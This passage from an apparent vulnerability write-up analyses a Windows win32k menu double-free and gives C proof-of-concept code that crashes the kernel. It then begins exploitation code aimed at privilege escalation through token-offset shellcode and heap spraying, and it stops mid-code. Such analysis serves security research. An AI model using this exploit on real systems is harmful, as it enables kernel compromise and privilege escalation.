After returning from function `xxxSetWindowPos`, function `xxxTrackPopupMenuEx` calls `xxxWindowEvent` function to send `EVENT_SYSTEM_MENUPOPUPSTART` event notification, which represents that the popup menu has been displayed.

```
xxxWindowEvent(6u, pwndHierarchy, 0xFFFFFFFC, 0, 0);
```

*Function xxxTrackPopupMenuEx sends MENUPOPUPSTART event*

If some window event procedures including this type of event are set previously in the user process, the system would dispatch these procedures during the thread message loop processing.

Then if the menu type is modal, the thread will enter the menu message loop waiting state, and will return directly if not.

To sum up in a picture:

![]()
*Main execution flow of function xxxTrackPopupMenuEx*

---

**bServerSideWindowProc**

The member flag bit `bServerSideWindowProc` of window structure `tagWND` object is a special flag bit, which determines whether the associated message procedure of the window object belongs to server side or client side. When going to call the message procedure of the target window object to dispatch messages, function `xxxSendMessageTimeout` judges if this flag bit is set.

```
  if ( *((_BYTE *)&pwnd->1 + 2) & 4 ) // bServerSideWindowProc
  {
    IoGetStackLimits(&uTimeout, &fuFlags);
    if ( &fuFlags - uTimeout < 0x1000 )
      return 0;
    lRet = pwnd->lpfnWndProc(pwnd, message, wParam, lParam);
    if ( !lpdwResult )
      return lRet;
    *(_DWORD *)lpdwResult = lRet;
  }
  else
  {
    xxxSendMessageToClient(pwnd, message, wParam, lParam, 0, 0, &fuFlags);
    [...]
  }
```

*The logic of function xxxSendMessageTimeout calling message procedure*

If the flag bit is set, the function would invoke the target window message procedure in the kernel context directly; otherwise, the function sends the message to the client side for processing by calling function `xxxSendMessageToClient`, the target window message procedure would be always called and executed in user context.

Special window objects such as menu window object have specialized kernel-mode message procedures, therefore the member flag bit `bServerSideWindowProc` of these window objects would be set during the creation of them. While common window objects just point to the default or user-defined message procedures, the flag bit would not be set.

If there are some methods to set the unset flag bit `bServerSideWindowProc` of a window object, the message procedure pointed to by the target window object would also be executed in the kernel context directly.

---

**Shadow Window**

In `win32k` kernel module of Windows XP and higher version Windows, the system creates and associates corresponding `SysShadow` classed shadow window object for every window object with `CS_DROPSHADOW` flag, in order to render the shadow effect of the original window. There is a global table `win32k!gpshadowFirst` used to store all the relations between shadow window object and original window object. Function `xxxAddShadow` is used to create shadow window object for specific window object, and to add the relation between them into `gpshadowFirst` global table.

Global table `gpshadowFirst` stores the relations of shadow windows in form of a linked list. Every node of the linked list stores three pointer size fields, respectively storing the object pointer of the original window and the shadow window, as well as the pointer to the next linked list node. Every newly added relation node will always be in the first node location of the linked list, whose address will be stored in `gpshadowFirst` global variable.

![]()
*Global variabe gpshadowFirst points to shadow window table*

Correspondingly, when the shadow window is no longer needed, the system calls `xxxRemoveShadow` to remove the relation node of the specified window object and destroy the shadow window object. The function finds the first matched node according to the original window object from parameters, then removes the node from the list and frees the node buffer, and destroys the shadow window object.

---

**Submenu**

If there is at least a submenu item in the menu currently displayed on the screen, when user selects it by clicking the mouse button, the system sends a `WM_LBUTTONDOWN` message which represents that the left mouse button is being pressed to the menu window object of the menu containing the item.

If the menu type is modeless (`MODELESS`), kernel function `xxxMenuWindowProc` receives this message and delivers to `xxxCallHandleMenuMessages` function.

Function `xxxCallHandleMenuMessages` is responsible for processing messages for modeless menu just like in the modal case. In the function, system calculates the actual coordinates where the mouse button is pressed according to the relative coordinates stored in the incoming parameter `lParam` and the absolute coordinates of the current window on the screen, and downward calls `xxxHandleMenuMessages` function.

The function passes the actual coordinate point to function `xxxMNFindWindowFromPoint` to find the window where the coordinate point is located on the screen, then sets field `uButtonDownHitArea` of the menu state structure as the pointer to the found window object. If the value is really a (menu) window object, the function would send an `MN_BUTTONDOWN` message to it.

Then the execution flow enters function `xxxMenuWindowProc` and calls function `xxxMNButtonDown` to handle `MN_BUTTONDOWN` message.

```
case 0x1EDu:
  if ( wParam < pmenu->cItems || wParam >= 0xFFFFFFFC )
    xxxMNButtonDown(popupMenu, menuState, wParam, 1);
  return 0;
```

*Function xxxMenuWindowProc calls xxxMNButtonDown*

Function `xxxMNButtonDown` calls `xxxMNSelectItem` function to select menu item according to the area where the mouse button is pressed and stores it into field `posSelectedItem` of current popup menu object. Then the function calls function `xxxMNOpenHierarchy` to open the new popup hierarchy menu.

During the execution of function `xxxMNOpenHierarchy`, system calls function `xxxCreateWindowEx` to create new `MENUCLASS` classed submenu window object, and to insert the popup menu structure `tagPOPUPMENU` created for the new submenu window object into the delayed free list of popup menu object.

The function sets field `spwndNextPopup` of the popup menu structure `tagPOPUPMENU` object associated with the current menu window object as the pointer to the newly allocated submenu window object, and sets field `spwndPrevPopup` of the popup menu structure `tagPOPUPMENU` object associated with the newly allocated menu window object as the pointer to the current submenu window object, to make the newly created popup menu object the submenu of the current menu object.

![]()
*Relation between current and newly created tagMENUWND objects*

The function sets flag bit `fHierarchyDropped` of current popup menu structure `tagPOPUPMENU` object, which means that the menu object has a popped up submenu.

Then the function calls `xxxSetWindowPos` to sets the position of the new menu window object and display it on the screen, and sends `EVENT_SYSTEM_MENUPOPUPSTART` event notification by calling function `xxxWindowEvent`. The corresponding shadow window object of the new menu window object is created and associated with the menu window object during the execution of `xxxSetWindowPos` function.

The summary execution flow is as below:

![]()
*Summary execution of opening hierarchy*

---

**End Menu**

There are multiple paths to reach function `xxxMNEndMenuState` in user processes, for example, by sending `MN_ENDMENU` message to a target menu window object, or calling `NtUserMNDragLeave` system service, etc.

When someone are sending `MN_ENDMENU` message to a target menu window object, the system calls function `xxxEndMenuLoop` in menu window message procedure `xxxMenuWindowProc` and passes the pointers to the menu state structure object associated with current thread and to the root popup menu object pointed to by field `pGlobalPopupMenu` of the menu state object as parameters in order to make sure the whole menu objects are ended or canceled. If the menu type is modeless, the function then calls function `xxxMNEndMenuState` in the current context to cleanup menu state information and to free related objects.

```
  menuState = pwnd->head.pti->pMenuState;
  [...]
LABEL_227: // EndMenu
  xxxEndMenuLoop(menuState, menuState->pGlobalPopupMenu);
  if ( menuState->flags & 0x100 )
    xxxMNEndMenuState(1);
  return 0;
```

*Function xxxMenuWindowProc processes MN\_ENDMENU message*

During the execution of function `xxxEndMenuLoop`, the system calls `xxxMNDismiss`, in which finally function `xxxMNCancel` would be called, to perform the operation of the menu cancellation.

```
int __stdcall xxxMNDismiss(tagMENUSTATE *menuState)
{
  return xxxMNCancel(menuState, 0, 0, 0);
}
```

*Function xxxMNDismiss calls xxxMNCancel*

Function `xxxMNCancel` calls `xxxMNCloseHierarchy` function to close the hierarchy state of the current popup menu object.

```
popupMenu = pMenuState->pGlobalPopupMenu;
[...]
xxxMNCloseHierarchy(popupMenu, pMenuState);
```

*Function xxxMNCancel calls xxxMNCloseHierarchy*

Function `xxxMNCloseHierarchy` judges if field `fHierarchyDropped` of the popup menu `tagPOPUPMENU` object from parameters has been set. If not, it means there is no popped up submenu from the current popup menu, then the system returns from this function.

Then function `xxxMNCloseHierarchy` retrieves the pointer stored in field `spwndNextPopup` of the current popup menu object, which points to the window object of the submenu that pops up from the current popup menu object. The function sends `MN_CLOSEHIERARCHY` message to the submenu window object by calling `xxxSendMessage` function. Finally function `xxxMenuWindowProc` receives this message and calls `xxxMNCloseHierarchy` for the popup menu object associated with the target window object to handle the task of closing the hierarchy state of the submenu object.

```
  popupMenu = *(tagPOPUPMENU **)((_BYTE *)pwnd + 0xb0);
  menuState = pwnd->head.pti->pMenuState;
  [...]
case 0x1E4u:
  xxxMNCloseHierarchy(popupMenu, menuState);
  return 0;
```

*Function xxxMenuWindowProc processes MN\_CLOSEHIERARCHY message*

After returning from function `xxxSendMessage`, function `xxxMNCloseHierarchy` calls `xxxDestroyWindow` to attempt to destroy the window object of the popup submenu window object, which should be noted that this is an attempt to destroy the window object of the popup submenu, rather than the window object of the current menu.

During the execution of function `xxxDestroyWindow`, the system calls function `xxxSetWindowPos` to hide the target menu window object from the screen.

```
dwFlags = 0x97;
if ( fAlreadyDestroyed )
  dwFlags = 0x2097;
xxxSetWindowPos(pwnd, 0, 0, 0, 0, 0, dwFlags);
```

*Function xxxDestroyWindow hide target window object*

At the end of the execution of function `xxxSetWindowPos`, corresponding to the case when creating the menu window object, the system calls function `xxxSendChangedMsgs` to send the message that the window position has changed. In this function, according to the set `SWP_HIDEWINDOW` state flag, by calling function `xxxRemoveShadow`, the system finds and removes the first relation node associated with the target menu window object from `gpshadowFirst` shadow window table and destroy the shadow window object.

Then the execution flow enters function `xxxFreeWindow` from `xxxDestroyWindow` to perform the subsequent destruction operation on the target window object.

The function calls corresponding message wrap procedure `xxxWrapMenuWindowProc` and passes `WM_FINALDESTROY` message as parameter according to the value of field `fnid` of target window object, and finally function `xxxMenuWindowProc` receives this message and performs the task of cleaning up releted data for the target popup menu object. In this function, field `fDestroyed` of target popup menu object and field `fFlushDelayedFree` of root popup menu object are set.

```
*(_DWORD *)popupMenu |= 0x8000u;
[...]
if ( *((_BYTE *)popupMenu + 2) & 1 )
{
  popupMenuRoot = popupMenu->ppopupmenuRoot;
  if ( popupMenuRoot )
    *(_DWORD *)popupMenuRoot |= 0x20000u;
}
```

*Function xxxMNDestroyHandler set releted flag bits*

Then function `xxxFreeWindow` calls function `xxxRemoveShadow` again for the target window object to remove the relation with shadow window. If all the related shadow windows of target window object have been removed before, function `xxxRemoveShadow` cannot match any relation node from relation table and return directly.

```
if ( pwnd->pcls->atomClassName == gatomShadow )
  CleanupShadow(pwnd);
else
  xxxRemoveShadow(pwnd);
```

*Function xxxFreeWindow removes shadow window object again*

The function returns to the superior caller after freeing and unlocking some objects. At this point, as the lock count has not returned to zero, the target window object still exists in the kernel and waits for subsequent operations.

After returning from function `xxxDestroyWindow`, the execution flow goes back to `xxxMNCloseHierarchy` function. The function unlocks the submenu window object pointed to by field `spwndNextPopup` of the current popup menu object and sets the field as zero, then assigns field `spwndActivePopup` of root popup menu object to the window object associated with current popup menu object with assignment lock, to select the current window object as the active popup menu window object, which causes the original submenu window object locked in field `spwndActivePopup` to be unlocked and its lock count to go down.

```
HMAssignmentLock(
  (_HEAD **)&popupMenu->ppopupmenuRoot->spwndActivePopup,
  (_HEAD *)popupMenu->spwndPopupMenu);
```

*Function xxxMNCloseHierarchy actives current menu window object*

The execution flow returns to function `xxxMNCancel` from function `xxxMNCloseHierarchy`, then the system calls `xxxDestroyWindow` function to attempt to destroy current menu window object according to field `fIsTrackPopup` of current popup menu object. This field of popup menu structure is only set when root menu window object is being created in function `xxxTrackPopupMenuEx` at the beginning.

After the execution flow going back to function `xxxMenuWindowProc`, the function calls `xxxMNEndMenuState` for modeless menu object to clean up menu state information and free related objects.

![]()
*Brief execution flow for menu selection or cancellation*

---

**Delayed Free List of Popup Menu Object**

There is a field named `ppmDelayedFree` in popup menu structure `tagPOPUPMENU`, used to link all the popup menu objects which are tagged as delayed-free state, so that all of them can be destroyed uniformly when the popup state of menu being ended.

Field `pGlobalPopupMenu` of the menu state `tagMENUSTATE` object associated with thread points to root popup menu object, whose field `ppmDelayedFree` is as the entry of the delayed free list of popup menu object pointing to the first node of the linked list. Field `ppmDelayedFree` of the subsequent popup menu objects in the list would point to the next list node object.

In function `xxxMNOpenHierarchy`, system insert the popup menu structure `tagPOPUPMENU` object associated with the newly created submenu window object into the delayed free list. The latest popup menu object is placed on the first node of the list, and its address is stored into field `ppmDelayedFree` of root popup menu object, while the original address of popup menu object in field `ppmDelayedFree` of root popup menu object is transferred to field `ppmDelayedFree` of the newly added popup menu object.

![]()
*Insert new popup menu object into delayed free list*

---

**xxxMNEndMenuState**

During function `xxxMNEndMenuState` being executed, the system calls function `MNFreePopup` to free root popup menu object pointed to by field `pGlobalPopupMenu` of current menu state `tagMENUSTATE` object.

At the beginning, function `MNFreePopup` judges if the target popup menu object is current root popup menu object from parameters or not. If so, the function calls `MNFlushDestroyedPopups` to traverse and frees each popup menu object in the delayed free list pointed to by field `ppmDelayedFree` of root menu object.

Function `MNFlushDestroyedPopups` traverses each popup menu object in the list, and calls `MNFreePopup` function for every object with flag bit `fDestroyed`. Flag bit `fDestroyed` is set in function `xxxMNDestroyHandler` in the first place.

```
ppmDestroyed = popupMenu;
for ( i = &popupMenu->ppmDelayedFree; *i; i = &ppmDestroyed->ppmDelayedFree )
{
  ppmFree = *i;
  if ( *(_DWORD *)*i & 0x8000 )
  {
    ppmFree = *i;
    *i = ppmFree->ppmDelayedFree;
    MNFreePopup(ppmFree);
  }
  [...]
}
```

*Function MNFlushDestroyedPopups traverse delayed free list*

After returning from function `MNFlushDestroyedPopups`, function `MNFreePopup` calls `HMAssignmentUnlock` to unlock the assignment lock for each window object fields such as `spwndPopupMenu`.

In the kernel of Windows, theres is a member structure `HEAD` object at the base location of every window object. This structure holds a copy of the handle value (`h`) as well as a lock count (`cLockObj`), incremented whenever an object is being used. When the object is no longer being used by a particular component, its lock count is decremented. At the point where the lock count reaches zero, the Window Manager knows that the object is no longer being used by the system and frees it.

Function `HMAssignmentUnlock` is used to unlock references with assignment lock that implemented for specific objects previously and decrease the lock count. At the point where the lock count of target object reaches zero, the system calls function `HMUnlockObjectInternal` to destroy it.

```
bToFree = head->cLockObj == 1;
--head->cLockObj;
if ( bToFree )
  head = HMUnlockObjectInternal(head);
return head;
```

*Function HMUnlockObject judges obnject that need to be destroyed*

Function `HMUnlockObjectInternal` finds the handle table entry from the handle table pointed to by field `aheList` of global shared information structure `gSharedInfo` object according to the handle value of the target object, and calls the object destroying routine indexed in global handle type information array `gahti` in function `HMDestroyUnlockedObject` according to the handle type stored in the handle table entry. If the target object to destroy currently is a window object, the execution flow would enter kernel function `xxxDestroyWindow`.

At the end of function `MNFreePopup`, as the unlocking and freeing of each field have been completed, system calls function `ExFreePoolWithTag` to free the target popup menu `tagPOPUPMENU` object.

It can be known by analyzing code that after freeing each field of menu state structure by calling function `MNFreePopup`, function `xxxMNEndMenuState` would stores the value of field `pmnsPrev` of current menu state object into field `pMenuState` of current thread information structure object, which is `0` in normal conditions.

```
kd> ub
win32k!xxxMNEndMenuState+0x50:
93a96022 8b4620          mov     eax,dword ptr [esi+20h]
93a96025 898704010000    mov     dword ptr [edi+104h],eax
kd> r eax
eax=00000000
```

*Function xxxMNEndMenuState resets pMenuState field*

However, in the course of the the menu is being in pop-up state, it is field `pMenuState` of thread information object that is used to retrieve menu state by the system in each function or system service tracking popup menu. Assigning this field to other value would cause some nodes in the triggering path to fail and to return directly, which leads to the failure of vulnerablity exploitation. Therefore, in order to make the thread execution flow reach the statement again in function `xxxMNEndMenuState` where the current `tagPOPUPMENU` object is to be freed to implement vulnerability triggering, **something must be done before the system resets field `pMenuState` of thread information object**.

There are only two calling statements during the time between freeing root popup menu object pointed to by field `pGlobalPopupMenu` and resetting field `pMenuState` of thread information object:

```
UnlockMFMWFPWindow(&menuState->uButtonDownHitArea);
UnlockMFMWFPWindow(&menuState->uDraggingHitArea);
```

Field `uButtonDownHitArea` and `uDraggingHitArea` of menu state structure store a pointer to the window object on which the coordinates where the mouse button pressed is located and a pointer to the window object on which the last coordinates where the mouse button pressed is located when dragging mouse. The function unlocks the assignment locks for the two fields by calling `UnlockMFMWFPWindow` function.

![]()
*Brief execution flow of function xxxMNEndMenuState*

Focus on `uButtonDownHitArea` field, which stores the address of the window object on which the coordinates where the mouse button pressed is located, unlocked and set as zero once the mouse button is up. Therefore, it is necessary to launch the operation to end menu during the system processing the message that the mouse button is being pressed, so that field `uButtonDownHitArea` would hold a legal address of window object when the execution flow reaches the statement unlocking this field in function `xxxMNEndMenuState`.

During destroying the window object, system also destroys the associated shadow window object. Since shadow window object doesn't have specialized message procedure, the field pointing to the message procedure of shadow window object can be modified to a user-defined custom message procedure. In the custom message procedure, launching the task of ending menu again may triggers vulnerablity successfully.

## 0x3 Triggering

In the next moment, we construct the proof of concept of this vulnerability, in which the thread execution flow would reenter `xxxMNEndMenuState` function during the time between freeing root popup menu object and resetting field `pMenuState` of current thread information object, in order to trigger the double-free of the object pointed to by the target field `pGlobalPopupMenu`.

Firstly create an independent thread for the proof code in the user process to host the execution of the main task of proof code. Listen to whether global variable `bDoneExploit` being assigned and wait the next operation in the original thread.

---

**Major Function of Proof Code**

At first, proof code creates two modeless 'popupable' menu object. Since modal menu would cause the thread to enter the loop waiting state in function `xxxMNLoop` in the kernel, which is difficult to trigger the bug, modeless menu type is selected. Here 'popupable' menu object is not an aforementioned `tagPOPUPMENU` object, but a `tagMENU` object with `MFISPOPUP` flag bit state. Structure `tagMENU` is the entity of menu, while `tagPOPUPMENU` object is used to describe popup state of menu object entity, created in popping up a menu, destroyed in ending a menu.

Then add menu item for the two menu by `AppendMenuA`, and make the second one the submenu of the first one.

```
LPCSTR szMenuItem = "item";
MENUINFO mi = { 0 };
mi.cbSize  = sizeof(mi);
mi.fMask   = MIM_STYLE;
mi.dwStyle = MNS_AUTODISMISS | MNS_MODELESS | MNS_DRAGDROP;

hpopupMenu[0] = CreatePopupMenu();
hpopupMenu[1] = CreatePopupMenu();
SetMenuInfo(hpopupMenu[0], &mi);
SetMenuInfo(hpopupMenu[1], &mi);
AppendMenuA(hpopupMenu[0], MF_BYPOSITION | MF_POPUP, (UINT_PTR)hpopupMenu[1], szMenuItem);
AppendMenuA(hpopupMenu[1], MF_BYPOSITION | MF_POPUP, 0, szMenuItem);
```

*Proof code of creating and associating menus*

Then create a common window object `hWindowMain` to be the owner window object of the popup menu which will pop up subsequently. If the target binary file is compiled as a GUI program, select the default window object as the owner instead of creating extra one.

```
WNDCLASSEXW wndClass = { 0 };
wndClass = { 0 };
wndClass.cbSize = sizeof(WNDCLASSEXW);
wndClass.lpfnWndProc    = DefWindowProcW;
wndClass.cbWndExtra     = 0;
wndClass.hInstance      = GetModuleHandleA(NULL);
wndClass.lpszMenuName   = NULL;
wndClass.lpszClassName  = L"WNDCLASSMAIN";
RegisterClassExW(&wndClass);
hWindowMain = CreateWindowExW(WS_EX_LAYERED | WS_EX_TOOLWINDOW | WS_EX_TOPMOST,
    L"WNDCLASSMAIN",
    NULL,
    WS_VISIBLE,
    0,
    0,
    1,
    1,
    NULL,
    NULL,
    GetModuleHandleA(NULL),
    NULL);
```

*Proof code of creating owner window object*

Create a `WH_CALLWNDPROC` classed hook procedure associated with current thread by calling `SetWindowsHookExW` function, and create an event notification procedure including `EVENT_SYSTEM_MENUPOPUPSTART` event associated with current process and current thread. As mentioned earlier, `WH_CALLWNDPROC` classed hook procedure is invoked before the system sending messages to the target window object. Event notification `EVENT_SYSTEM_MENUPOPUPSTART` represents that the target popup menu has been displayed on the screen.

```
SetWindowsHookExW(WH_CALLWNDPROC, xxWindowHookProc,
    GetModuleHandleA(NULL),
    GetCurrentThreadId());
SetWinEventHook(EVENT_SYSTEM_MENUPOPUPSTART, EVENT_SYSTEM_MENUPOPUPSTART,
    GetModuleHandleA(NULL),
    xxWindowEventProc,
    GetCurrentProcessId(),
    GetCurrentThreadId(),
    0);
```

*Proof code of creating hook procedure and event notification procedure*

Proof code calls function `TrackPopupMenuEx` to make the first menu the root menu and pop up it on the screen.

```
TrackPopupMenuEx(hpopupMenu[0], 0, 0, 0, hWindowMain, NULL);
```

*Proof code of calling function TrackPopupMenuEx*

Then realize message loop by calling functions such as `GetMessage` and `DispatchMessage` in current thread.

```
MSG msg = { 0 };
while (GetMessageW(&msg, NULL, 0, 0))
{
    TranslateMessage(&msg);
    DispatchMessageW(&msg);
}
```

*Proof code of message loop*

Proof code calss function `TrackPopupMenuEx` in the user process to make the execution flow enter `xxxTrackPopupMenuEx` function in the kernel.

![]()
*Execution logic of major function of proof code*

---

**Custom Hook Procedure**

During the execution of function `TrackPopupMenuEx`, system calls function `xxxCreateWindowEx` to create new menu classed window object. As mentioned in previous section, when the window object is created successfully, the function sends `WM_NCCREATE` message to the window object. Before calling the object-specified message procedure, function `xxxSendMessageTimeout` also calls `xxxCallHook` function to invoke `WH_CALLWNDPROC` classed hook procedures defined by user processes previously. At this point the execution flow calls back to the hook procedure defined previously by us in the proof code.

In the custom hook procedure `xxWindowHookProc`, we judge whether the currently handled message is `WM_NCCREATE` message according to field `message` of the `tagCWPSTRUCT` object pointed to by parameter `lParam`. If so, we retrieve the class name of the window object by the window handle. It means that it is the created menu window object when the class name is `#32768`, we just record the handle value for subsequent references.

```
LRESULT CALLBACK
xxWindowHookProc(INT code, WPARAM wParam, LPARAM lParam)
{
    tagCWPSTRUCT *cwp = (tagCWPSTRUCT *)lParam;
    static HWND hwndMenuHit = 0;
    if (cwp->message != WM_NCCREATE)
    {
        return CallNextHookEx(0, code, wParam, lParam);
    }
    WCHAR szTemp[0x20] = { 0 };
    GetClassNameW(cwp->hwnd, szTemp, 0x14);
    if (!wcscmp(szTemp, L"#32768"))
    {
        hwndMenuHit = cwp->hwnd;
    }
    return CallNextHookEx(0, code, wParam, lParam);
}
```

*Recording handle of #32768 window in hook procedure*

When the target menu window object is created, system sets the location coordinates of the window object in the kernel and displays it on the screen. In the meantime, system creates `SysShadow` classed shadow window object for the target window object. In the same way, system also calls `xxxCallHook` function to dispatch hook procedures when creating shadow window object and sending `WM_NCCREATE` message.

It is known in the analysis of part "End Menu" in previous section, during the execution of function `xxxEndMenuLoop`, system calls `xxxRemoveShadow` function twice for each popup menu window object, which would cause the shadow window to be unassociated and destroyed in advance before it reaches the vulnerability triggering location. **Therefore, we should find a way to create and associate with at least 3 shadow window objects for the target menu window object.**

Looking back to the custom hook procedure of the proof code, we add the `SysShadow` case into the judgement of window class name. If this case is hit, we set `SWP_HIDEWINDOW` and `SWP_SHOWWINDOW` state flag successively for the previously saved `#32768` classed window object, to make the window hidden at first and then displayed, in order to trigger the logic of associating with shadow window in the kernel once again to create a new extra shadow window object.

It is during the shadow window being created in `xxxCreateWindowEx` in the kernel when the execution flow enters the `SysShadow` processing logic in the custom hook procedure. By this time, the association of created shadow window object and the original window object has not been built yet, and the relation between them has not been insert into `gpShadowFirst` list. It would create and associate with multiple shadow window objects for the target menu window object by calling `SetWindowPos` to set `SWP_SHOWWINDOW` state flag for it at this time. Shadow window object created later will be inserted into the list earlier to be located in the back of the list.

![]()
*Logic of inserting multiple shadow windows association*

In `SysShadow` processing logic of the custom hook procedure, we count the time of entry, and call `SetWindowPos` to trigger the logic of creating new shadow window association in the beginning twice, and modify the message procedure field of the target shadow window object to a custom shadow window message procedure defined by proof code in the last time.

```
if (!wcscmp(szTemp, L"SysShadow") && hwndMenuHit != NULL)
{
    if (++iShadowCount == 3)
    {
        SetWindowLongW(cwp->hwnd, GWL_WNDPROC, (LONG)xxShadowWindowProc);
    }
    else
    {
        SetWindowPos(hwndMenuHit, NULL, 0, 0, 0, 0, SWP_NOSIZE | SWP_NOMOVE | SWP_NOZORDER | SWP_HIDEWINDOW);
        SetWindowPos(hwndMenuHit, NULL, 0, 0, 0, 0, SWP_NOSIZE | SWP_NOMOVE | SWP_NOZORDER | SWP_SHOWWINDOW);
    }
}
```

*Proof code of creating mutiple shadow windows*

After everything is performed properly, it is necessary to set a global flag variable to prevent the execution flow from repeatedly entering the custom hook procedure so that the logic code above is executed multiple times.

![]()
*Execution logic of creating mutiple shadow windows*

---

**Custom Event Notification Procedure**

When finishing the creation of root popup menu object in kernel function `xxxTrackPopupMenuEx`, the system calls `xxxWindowEvent` to send `EVENT_SYSTEM_MENUPOPUPSTART` event notification, which makes the execution flow enter the custom event notification procedure `xxWindowEventProc` defined by us previously. It means currently a new popup menu has been dieplayed on the screen every time when the system enters this procedure.

Counting in the custom event notification procedure of proof code, it means that root popup menu has been displayed on the scren at the first time the execution flow enters the procedure. So we call function `SendMessage` to send `WM_LBUTTONDOWN` message to the menu window object pointed to by parameter handle `hwnd` and set parameter `lParam` as the relative coordinates where the left button is being pressed. In 32-bit system, parameter `lParam` is a `DWORD` type integer number, whose high 16 bits and low 16 bits indicate respectively the relative positions of the horizontal and vertical coordinates. Parameter `wParam` determines which mouse button has been being pressed, and being `1` means `MK_LBUTTON` left mouse button.

Message procedure `xxxMenuWindowProc` receives and processes this message in the kernel, which causes the execution flow to call function `xxxMNOpenHierarchy` at last to create new popup menu related objects. Similarly, after finishing the display of the new submenu on the screen, function `xxxMNOpenHierarchy` calls function `xxxWindowEvent` to send `EVENT_SYSTEM_MENUPOPUPSTART` event notification, which makes the execution enter the custom event notification procedure `xxWindowEventProc` repeatly.

It means the submenu has been displayed on the screen at the second time when the execution flow enters function `xxWindowEventProc`. At this point we call function `SendMessage` to send `MN_ENDMENU` message which means ending the menu to the target submenu window object, which causes the execution flow to enter kernel function `xxxMNEndMenuState` at the end.

```
VOID CALLBACK
xxWindowEventProc(
    HWINEVENTHOOK hWinEventHook,
    DWORD         event,
    HWND          hwnd,
    LONG          idObject,
    LONG          idChild,
    DWORD         idEventThread,
    DWORD         dwmsEventTime
)
{
    if (++iMenuCreated >= 2)
    {
        SendMessageW(hwnd, MN_ENDMENU, 0, 0);
    }
    else
    {
        SendMessageW(hwnd, WM_LBUTTONDOWN, 1, 0x00020002); // (2,2)
    }
}
```

*Proof code of custom event notification procedure*

When the execution flow enters function `xxxMNEndMenuState`, field `uButtonDownHitArea` of the menu state object associated with thread holds a pointer to the window object on which the coordinates where the mouse button pressed is located (the menu window object associated with three shadow window objects created previously). Since the first two shadow window objects associated with this menu window object in `gShadowFirst` list were unassociated and destroyed in function `xxxEndMenuLoop`, at this point the last shadow window node still exists in the list, whose message procedure field has been modified.

After freeing current root popup menu object in `MNFreePopup`, when the function calls `UnlockMFMWFPWindow` to unlock the target menu window object stored in field `uButtonDownHitArea`, if everything goes well, the lock count of this window object reaches zero then the menu manager would call `xxxDestroyWindow` function to perform the destroying task. At this point, the third associated shadow window object would be unassociated and destroyed and the execution flow would enter the custom shadow window message procedure previously modified with.

---

**Custom Shadow Window Message Procedure**

In the custom shadow window message procedure `xxShadowWindowProc` of the proof code, we judge whether the message parameter is `WM_NCDESTROY` or not. If so, we call `NtUserMNDragLeave` system service here.

```
ULONG_PTR
xxSyscall(UINT num, ULONG_PTR param1, ULONG_PTR param2)
{
    __asm { mov eax, num };
    __asm { int 2eh };
}

CONST UINT num_NtUserMNDragLeave = 0x11EC;

LRESULT WINAPI
xxShadowWindowProc(
    _In_ HWND   hwnd,
    _In_ UINT   msg,
    _In_ WPARAM wParam,
    _In_ LPARAM lParam
)
{
    if (msg == WM_NCDESTROY)
    {
        xxSyscall(num_NtUserMNDragLeave, 0, 0);
    }
    return DefWindowProcW(hwnd, msg, wParam, lParam);
}
```

*Proof code of custom shadow window message procedure*

The function is commonly used to end the dragging state of menu. During the execution of this function, after a series of judgements and calls, the system calls function `xxxMNEndMenuState` in function `xxxUnlockMenuState` at last.

```
  bZeroLock = menuState->dwLockCount-- == 1;
  if ( bZeroLock && ExitMenuLoop(menuState, menuState->pGlobalPopupMenu) )
  {
    xxxMNEndMenuState(1);
    result = 1;
  }
```

*Function xxxUnlockMenuState calls xxxMNEndMenuState*

This results in the retouching of the location where the vulnerability is located and the double-free of the root popup menu object pointed to by field `pGlobalPopupMenu` of menu state object, which leads to BSOD of the operating system.

![]()
*Double-free of root popup menu leads to BSOD*

## 0x4 Exploitation

The previous sections analyze the vulnerability principle and construct a simple triggering proof code of the vulnerability. In this section we will exploit the vulnerablitiy, constructing exploitation code in a step-by-step manner, to achieve exploitation and elevation of privilege at the end.

---

**Initialize Exploitation Data**

In the exploitation code we define a custom structure `SHELLCODE` to store exploitation-related data:

```
typedef struct _SHELLCODE {
    DWORD reserved;
    DWORD pid;
    DWORD off_CLS_lpszMenuName;
    DWORD off_THREADINFO_ppi;
    DWORD off_EPROCESS_ActiveLink;
    DWORD off_EPROCESS_Token;
    PVOID tagCLS[0x100];
    BYTE  pfnWindProc[];
} SHELLCODE, *PSHELLCODE;
```

*Definition of custom structure SHELLCODE*

Allocate a whole page size `RWX` memory block as a `SHELLCODE` object in user process at the beginning of exploitation code and initialize the fields, then copy the function code of Shellcode to the memory based from the address of field `pfnWindProc`.

```
pvShellCode = (PSHELLCODE)VirtualAlloc(NULL, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
if (pvShellCode == NULL)
{
    return 0;
}
ZeroMemory(pvShellCode, 0x1000);
pvShellCode->pid = GetCurrentProcessId();
pvShellCode->off_CLS_lpszMenuName    = 0x050;
pvShellCode->off_THREADINFO_ppi      = 0x0b8;
pvShellCode->off_EPROCESS_ActiveLink = 0x0b8;
pvShellCode->off_EPROCESS_Token      = 0x0f8;
CopyMemory(pvShellCode->pfnWindProc, xxPayloadWindProc, sizeof(xxPayloadWindProc));
```

*Initialize allocated SHELLCODE structure memory*

The memory area base from field `pfnWindProc` would be the practical Sellcode function code to be executed in the kernel context.

---

**Fake Popup Object**

During the execution of custom shadow window message procedure `xxShadowWindowProc` in exploitation code, it is necessary to allocate muptiple memory buffers of the same size as `tagPOPUPMENU` structure to occupy the memory space freed just now in the kernel by calling some related functions, in order to fake a new popup menu object to make the system believe that the root popup menu object is still in the kernel.

It can be achieved by calling function `SetClassLong` to set field `MENUNAME` for a number of common window objects. These window objcts should be created and initialized before the first time calling function `TrackPopupMenuEx`.

Looking back to the location of creating menu objects before calling function `TrackPopupMenuEx`, we add statements that calls function `CreateWindowEx` to create a number of common window object, and register independent window class for each window object.

```
for (INT i = 0; i < 0x100; ++i)
{
    WNDCLASSEXW Class = { 0 };
    WCHAR szTemp[20] = { 0 };
    HWND hwnd = NULL;
    wsprintfW(szTemp, L"%x-%d", rand(), i);
    Class.cbSize        = sizeof(WNDCLASSEXW);
    Class.lpfnWndProc   = DefWindowProcW;
    Class.cbWndExtra    = 0;
    Class.hInstance     = GetModuleHandleA(NULL);
    Class.lpszMenuName  = NULL;
    Class.lpszClassName = szTemp;
    RegisterClassExW(&Class);
    hwnd = CreateWindowExW(0, szTemp, NULL, WS_OVERLAPPED,
        0,
        0,
        0,
        0,
        NULL,
        NULL,
        GetModuleHandleA(NULL),
        NULL);
